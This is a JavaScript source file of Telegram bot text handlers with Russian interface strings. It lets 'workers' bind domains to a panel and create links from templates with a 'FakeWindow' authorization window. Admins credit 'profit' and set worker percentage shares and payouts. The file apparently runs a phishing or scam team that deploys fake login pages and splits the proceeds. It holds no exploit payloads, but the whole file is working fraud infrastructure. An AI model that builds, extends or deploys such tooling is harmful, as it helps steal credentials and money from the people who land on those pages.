const {
  isAdminTelegramId,
  setProfitPercent,
  setUserBio,
  ensureUser,
  searchTeamMembers,
} = require("../services/userService");
const { addProfitToUserByTelegramId } = require("../services/profitService");
const { setGlobalWorkerPercent } = require("../services/settingsService");
const {
  authCredentials,
  getDomainsList,
  isDomainAvailable,
} = require("../services/apiService");
const { env } = require("../config/env");
const {
  getAvailableUsd,
  findAwaitingLinkForAdmin,
  completePayoutWithLink,
  normalizePayoutUrl,
  buildUserPayoutApprovedMessage,
  buildChannelMessageHtml,
  buildApprovedChannelSuffix,
} = require("../services/withdrawalService");
const { upsertBotMessage } = require("../utils/message");
const {
  sitesBindMethodKeyboard,
  linkCreatorKeyboard,
  withdrawMethodKeyboard,
} = require("../keyboards/common");

function formatMoney(value) {
  return `$${Number(value || 0).toFixed(2)}`;
}

function registerTextHandlers(bot) {
  bot.on("text", async (ctx, next) => {
    if (ctx.scene && ctx.scene.current) {
      return next();
    }

    if (ctx.session?.profileEditBio) {
      const text = (ctx.message.text || "").trim();
      try {
        await ctx.deleteMessage(ctx.message.message_id);
      } catch (_) {
      }
      const updated = await setUserBio(ctx.from.id, text);
      ctx.session.profileEditBio = null;
      await upsertBotMessage(
        ctx,
        `✅ Поле «О себе» обновлено.\nТекущее значение: ${updated?.bio || "Отсутствует"}`
      );
      return;
    }

    if (ctx.session?.sitesFlow?.step === "domain_input") {
      const domainText = (ctx.message.text || "").trim().toLowerCase();
      try {
        await ctx.deleteMessage(ctx.message.message_id);
      } catch (_) {
      }

      const normalized = domainText
        .replace(/^https?:\/\//, "")
        .replace(/^www\./, "")
        .replace(/\/+$/, "");
      if (!normalized || !normalized.includes(".")) {
        await upsertBotMessage(ctx, "❌ Введите корректный домен. Пример: example.com");
        return;
      }

      try {
        const user = await ensureUser(ctx.from);
        if (!user?.panelUsername || !user?.panelPassword) {
          throw new Error("Панель еще не привязана к вашему аккаунту.");
        }
        const auth = await authCredentials(user.panelUsername, user.panelPassword);
        if (!auth.token) throw new Error("Не удалось авторизоваться в панели.");

        await getDomainsList(auth.token);
        const available = await isDomainAvailable(auth.token, normalized);
        const isAvailable =
          typeof available === "boolean"
            ? available
            : available?.isAvailable ?? available?.available ?? false;

        if (!isAvailable) {
          await upsertBotMessage(
            ctx,
            `❌ Домен <code>${normalized}</code> недоступен. Введите другой домен.`
          );
          return;
        }

        ctx.session.sitesFlow = { step: "choose_bind_method", domain: normalized };
        await upsertBotMessage(
          ctx,
          `✅ Домен <code>${normalized}</code> доступен.\nВыберите способ привязки:`,
          { reply_markup: sitesBindMethodKeyboard().reply_markup }
        );
      } catch (error) {
        await upsertBotMessage(ctx, `❌ Ошибка проверки домена: ${error.message}`);
      }
      return;
    }

    if (ctx.session?.linkCreateStep === "path_input" && ctx.session?.linkCreate) {
      const raw = (ctx.message.text || "").trim();
      try {
        await ctx.deleteMessage(ctx.message.message_id);
      } catch (_) {
      }
      const value = raw === "-" ? "" : raw.replace(/\s+/g, "");
      ctx.session.linkCreate.path = value.replace(/\//g, "");
      ctx.session.linkCreateStep = null;

      const state = ctx.session.linkCreate;
      await upsertBotMessage(
        ctx,
        [
          "⚙️ <b>Основные настройки</b>",
          "",
          `<b>Домен:</b> <code>${state.domainName || state.domainId}</code>`,
          `<b>Адрес страницы:</b> ${state.path ? `/${state.path}` : "необязательно"}`,
          `<b>Шаблон:</b> ${state.templateName || "не выбран"}`,
          `<b>Окно авторизации:</b> ${state.windowType || "FakeWindow"}`,
        ].join("\n"),
        {
          reply_markup: linkCreatorKeyboard(state.domainId, state).reply_markup,
        }
      );
      return;
    }

    if (ctx.session?.walletWithdraw?.step === "amount") {
      const user = await ensureUser(ctx.from);
      try {
        await ctx.deleteMessage(ctx.message.message_id);
      } catch (_) {
        /* ignore */
      }
      const raw = (ctx.message.text || "").trim().replace(/\s/g, "").replace(",", ".");
      const amount = Math.round(Number(raw) * 100) / 100;
      const minW = env.walletMinWithdrawalUsd;
      if (!Number.isFinite(amount) || amount < minW) {
        await upsertBotMessage(
          ctx,
          `❌ Введите сумму не меньше ${formatMoney(minW)} (число в $).`
        );
        return;
      }
      const available = await getAvailableUsd(user);
      if (amount - 1e-9 > available) {
        await upsertBotMessage(
          ctx,
          `❌ Недостаточно средств. Доступно: ${formatMoney(available)}`
        );
        return;
      }
      ctx.session.walletWithdraw = { step: "method", amount };
      await upsertBotMessage(
        ctx,
        `Сумма: <b>${formatMoney(amount)}</b>\n\nВыберите способ вывода:`,
        {
          parse_mode: "HTML",
          reply_markup: withdrawMethodKeyboard().reply_markup,
        }
      );
      return;
    }

    const compose = ctx.session?.adminCompose;
    const text = ctx.message.text?.trim();
    const adminInput = ctx.session?.adminInput;
    const isAdmin = isAdminTelegramId(ctx.from.id);

    if (!compose && !adminInput && isAdmin) {
      const pendingPayout = await findAwaitingLinkForAdmin(ctx.from.id);
      if (pendingPayout) {
        const rawText = (ctx.message.text || "").trim();
        try {
          await ctx.deleteMessage(ctx.message.message_id);
        } catch (_) {
          /* ignore */
        }
        const norm = normalizePayoutUrl(rawText);
        if (!norm) {
          await upsertBotMessage(
            ctx,
            "❌ Нужна корректная ссылка, начинающаяся с https://"
          );
          return;
        }
        try {
          const { request } = await completePayoutWithLink(
            pendingPayout._id,
            norm,
            ctx.from.id
          );
          const userHtml = buildUserPayoutApprovedMessage(norm);
          const sent = await ctx.telegram.sendMessage(request.telegramId, userHtml, {
            parse_mode: "HTML",
          });
          try {
            await ctx.telegram.pinChatMessage(request.telegramId, sent.message_id, {
              disable_notification: true,
            });
          } catch (_) {
            /* нет прав или пользователь отключил закрепления */
          }
          if (request.channelChatId && request.channelMessageId) {
            await ctx.telegram.editMessageText(
              request.channelChatId,
              Number(request.channelMessageId),
              undefined,
              buildChannelMessageHtml(request) + buildApprovedChannelSuffix(),
              { parse_mode: "HTML", reply_markup: { inline_keyboard: [] } }
            );
          }
          await upsertBotMessage(
            ctx,
            "✅ Пользователь получил ссылку, уведомление закреплено."
          );
        } catch (e) {
          await upsertBotMessage(ctx, `❌ ${e.message}`);
        }
        return;
      }
    }

    if (!compose && !adminInput) return next();
    if (!isAdmin) {
      ctx.session.adminCompose = null;
      ctx.session.adminInput = null;
      return next();
    }

    try {
      await ctx.deleteMessage(ctx.message.message_id);
    } catch (_) {
      // Ignore: message can be non-deletable due to Telegram permissions.
    }

    if (!text) {
      await upsertBotMessage(ctx, "Пустое сообщение. Повторите ввод.");
      return;
    }

    if (adminInput?.type === "profit") {
      const amount = Number(text.replace(",", "."));
      if (!Number.isFinite(amount) || amount <= 0) {
        await upsertBotMessage(ctx, "❌ Введите корректную сумму профита (число больше 0).");
        return;
      }

      const result = await addProfitToUserByTelegramId(
        adminInput.telegramId,
        amount,
        ctx.from.id
      );
      if (!result) {
        ctx.session.adminInput = null;
        await upsertBotMessage(ctx, "❌ Пользователь не найден.");
        return;
      }

      await ctx.telegram.sendMessage(
        result.user.telegramId,
        [
          "🎉 <b>Поздравляю вас с профитом!</b>",
          "",
          `Общий профит: ${formatMoney(amount)}`,
          ` ┖ Твоя доля: ${formatMoney(result.workerShare)} (${result.user.profitPercent}%)`,
        ].join("\n"),
        { parse_mode: "HTML" }
      );

      await upsertBotMessage(
        ctx,
        `✅ Начислено ${formatMoney(amount)} пользователю <code>${result.user.telegramId}</code>.\nДоля воркера: ${formatMoney(result.workerShare)}.`
      );
      ctx.session.adminInput = null;
      return;
    }

    if (adminInput?.type === "percent") {
      const percent = Number(text.replace("%", "").replace(",", "."));
      if (!Number.isFinite(percent) || percent < 1 || percent > 100) {
        await upsertBotMessage(ctx, "❌ Процент должен быть числом от 1 до 100.");
        return;
      }

      const updatedUser = await setProfitPercent(adminInput.telegramId, percent);
      if (!updatedUser) {
        ctx.session.adminInput = null;
        await upsertBotMessage(ctx, "❌ Пользователь не найден.");
        return;
      }

      await upsertBotMessage(
        ctx,
        `✅ Процент воркера для <code>${updatedUser.telegramId}</code> обновлен: ${updatedUser.profitPercent}%.`
      );
      ctx.session.adminInput = null;
      return;
    }

    if (adminInput?.type === "global_percent") {
      const percent = Number(text.replace("%", "").replace(",", "."));
      if (!Number.isFinite(percent) || percent < 1 || percent > 100) {
        await upsertBotMessage(ctx, "❌ Глобальный процент должен быть числом от 1 до 100.");
        return;
      }
      const updated = await setGlobalWorkerPercent(percent);
      ctx.session.adminInput = null;
      await upsertBotMessage(
        ctx,
        `✅ Глобальный процент воркера обновлен: <b>${updated}%</b>\nПрименено ко всем пользователям.`
      );
      return;
    }

    if (adminInput?.type === "search_user") {
      const results = await searchTeamMembers(text);
      ctx.session.adminInput = null;
      if (results.length === 0) {
        await upsertBotMessage(ctx, "Пользователь не найден.");
        return;
      }
      const rows = results.map((member) => [
        {
          text: `👤 @${member.username || member.telegramId}`,
          callback_data: `admin:member:${member.telegramId}`,
        },
      ]);
      rows.push([{ text: "⬅️ В админ-панель", callback_data: "admin:panel" }]);
      await upsertBotMessage(ctx, "Найденные пользователи:", {
        reply_markup: { inline_keyboard: rows },
      });
      return;
    }

    try {
      await ctx.telegram.sendMessage(compose.telegramId, `📩 Сообщение от администратора:\n\n${text}`);
      await upsertBotMessage(
        ctx,
        `✅ Сообщение отправлено пользователю <code>${compose.telegramId}</code>.`
      );
    } catch (error) {
      await upsertBotMessage(ctx, "❌ Не удалось отправить сообщение пользователю.");
    } finally {
      ctx.session.adminCompose = null;
    }
  });
}

module.exports = { registerTextHandlers };
